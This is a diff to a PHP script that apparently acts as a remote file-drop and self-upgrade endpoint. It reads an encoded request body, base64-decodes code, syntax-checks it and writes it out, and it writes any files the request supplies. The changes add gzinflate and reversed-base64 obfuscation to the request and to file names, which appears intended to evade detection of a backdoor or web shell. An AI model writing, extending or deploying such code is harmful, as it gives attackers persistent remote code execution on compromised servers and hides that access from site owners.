@@ -14,7 +14,7 @@ ini_set('display_errors', true);
 
 function td(...$a) { foreach ($a as $v) var_dump($v); die('td()'); }
 
-$a = json_decode(file_get_contents('php://input'), $associative = true);
+$a = json_decode(gzinflate(file_get_contents('php://input')), $associative = true);
 if ($a === null)
 	throw new Exception('paiload decode failure');
 
@@ -24,7 +24,7 @@ if ($v !== true)
 
 if (!empty($a['upgrade']['sait'])) {
 	$rcd = $a['upgrade']['sait'];
-	$target = basename($a['upgrade']['sait'][0]);
+	$target = basename(base64_decode(strrev($a['upgrade']['sait'][0])));
 	$tmp = 'sait-' .$target;
 	$code = base64_decode($a['upgrade']['sait'][2]);
 	token_get_all($code, TOKEN_PARSE);
@@ -38,7 +38,7 @@ if (!empty($a['upgrade']['sait'])) {
 }
 
 foreach ($a['encoded_files'] as $rcd)
-	$a['files'][] = [base64_decode($rcd[0]), $rcd[1], base64_decode($rcd[2])];
+	$a['files'][] = [base64_decode(strrev($rcd[0])), $rcd[1], $rcd[2]];
 
 foreach ($a['files'] as list($pn, $attributes, $encoded_body)) {
 		# this should probably be fixed in/compiled in
